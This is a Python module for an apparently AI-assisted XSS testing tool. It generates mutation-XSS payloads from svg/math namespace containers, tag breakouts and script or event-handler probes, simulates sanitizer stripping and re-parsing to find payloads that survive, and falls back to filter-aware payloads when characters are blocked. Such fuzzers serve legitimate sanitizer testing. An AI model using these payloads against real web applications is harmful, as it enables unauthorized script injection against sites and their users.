"""Local Coverage-Guided Grammar Fuzzer & Fixpoint Mutation Engine.

Replaces ungrounded LLM guessing with unlimited, zero-cost local experiments
against ground truth HTML/SVG/MathML parser state machines and fixpoint mutations.
"""
from dataclasses import dataclass, field
import random
import re
from typing import Any, Dict, List, Optional, Set, Tuple

from fuzzer.mxss_simulator import MXSSSimulator
from fuzzer.payload_knowledge_base import PayloadKnowledgeBase


@dataclass
class LocalFuzzCandidate:
    """A generated payload candidate with parser coverage telemetry."""
    payload: str
    states_covered: Set[str] = field(default_factory=set)
    mutation_score: float = 0.0
    reaches_executable_sink: bool = False
    fixpoint_mutated_markup: Optional[str] = None


class LocalGrammarFuzzer:
    """Coverage-guided local grammar fuzzer and mXSS fixpoint discovery engine."""

    # Primitives for local grammar assembly
    TAG_PRIMITIVES = [
        "svg", "math", "style", "textarea", "title", "xmp", "iframe",
        "foreignObject", "annotation-xml", "details", "template", "form", "button"
    ]
    
    NAMESPACE_CONTAINERS = [
        ("<svg><style>", "</style></svg>"),
        ("<math><style>", "</style></math>"),
        ("<svg><foreignObject><div>", "</div></foreignObject></svg>"),
        ("<math><annotation-xml encoding=\"text/html\">", "</annotation-xml></math>"),
        ("<template shadowrootmode=\"open\">", "</template>"),
    ]

    EXEC_PAYLOADS = [
        "<script>__XSS__('{TOKEN}')</script>",
        "<img src=x onerror=__XSS__('{TOKEN}')>",
        "<svg onload=__XSS__('{TOKEN}')>",
        "<details open ontoggle=__XSS__('{TOKEN}')>",
    ]

    BREAKOUT_SEQUENCES = [
        "</style>", "</textarea>", "</title>", "</xmp>",
        "-->", "\">", "'>", "`>", "]]>", "</annotation-xml>"
    ]

    @classmethod
    def run_fixpoint_search(
        cls,
        token: str,
        max_trials: int = 50,
        simulated_sanitizer_filter: Optional[List[str]] = None
    ) -> List[LocalFuzzCandidate]:
        """Search for fixpoint mXSS mutations: parse(serialize(parse(X))) creates executable script."""
        candidates: List[LocalFuzzCandidate] = []
        filter_regexes = [re.compile(re.escape(f), re.IGNORECASE) for f in (simulated_sanitizer_filter or [])]

        for _ in range(max_trials):
            prefix, suffix = random.choice(cls.NAMESPACE_CONTAINERS)
            breakout = random.choice(cls.BREAKOUT_SEQUENCES)
            exec_probe = random.choice(cls.EXEC_PAYLOADS).replace("{TOKEN}", token)
            
            # Formulate raw candidate: container + breakout + executable probe + suffix
            raw_payload = f"{prefix}{breakout}{exec_probe}{suffix}"
            
            # Step 1: Simulate Sanitizer stripping (if active)
            sanitized = raw_payload
            for rx in filter_regexes:
                sanitized = rx.sub("", sanitized)

            # Step 2: Parse to AST Tree (First Pass)
            tree_a = MXSSSimulator.parse_to_tree(sanitized)
            serialized_a = MXSSSimulator.serialize_tree(tree_a)

            # Step 3: Re-parse (Second Pass - Browser HTML Parser Fixpoint)
            tree_b = MXSSSimulator.parse_to_tree(serialized_a)
            serialized_b = MXSSSimulator.serialize_tree(tree_b)

            # Track parser states covered
            states = cls._extract_parser_states(tree_b)

            # Check if fixpoint output contains executable script or event handler
            has_script = bool(
                re.search(r'<script[^>]*>[^<]*__XSS__', serialized_b, re.IGNORECASE) or
                re.search(r'\bon[a-z]+\s*=\s*__XSS__', serialized_b, re.IGNORECASE)
            )

            diff_score = MXSSSimulator.check_mutation_differential(raw_payload)

            cand = LocalFuzzCandidate(
                payload=raw_payload,
                states_covered=states,
                mutation_score=diff_score,
                reaches_executable_sink=has_script,
                fixpoint_mutated_markup=serialized_b
            )

            if has_script or diff_score > 0:
                candidates.append(cand)

        # Sort by reachability and mutation score
        candidates.sort(key=lambda c: (c.reaches_executable_sink, c.mutation_score), reverse=True)
        return candidates

    @classmethod
    def _extract_parser_states(cls, tree: List[Dict[str, Any]]) -> Set[str]:
        """Extract namespace and container parser states from AST tree."""
        states = set()
        for node in tree:
            if node.get("tag") != "#text":
                states.add(f"tag:{node.get('tag')}")
                states.add(f"ns:{node.get('namespace')}")
                states.update(cls._extract_parser_states(node.get("children", [])))
        return states

    @classmethod
    def evolve_grammar_population(
        cls,
        token: str,
        generations: int = 3,
        population_size: int = 20,
        blocked_chars: Optional[Set[str]] = None
    ) -> List[str]:
        """Evolves grammar population offline with local fitness evaluation."""
        blocked = blocked_chars or set()
        pop = cls.run_fixpoint_search(token=token, max_trials=population_size)
        
        survivors = []
        for cand in pop:
            # Check character restrictions
            if not any(c in cand.payload for c in blocked if len(c) == 1):
                survivors.append(cand.payload)

        if not survivors:
            # Fallback to knowledge base with explicit filter profile
            from backend_api.models.filter_profile import FilterProfile
            profile = FilterProfile(blocked_tokens=list(blocked))
            # If brackets are blocked, use attribute or JS string context
            ctx = "ATTR_QUOTED" if "<" in blocked or ">" in blocked else "HTML_TEXT"
            return PayloadKnowledgeBase.get_context_payloads(
                context_type=ctx,
                filter_profile=profile,
                token=token,
                limit=10
            )

        return survivors[:10]
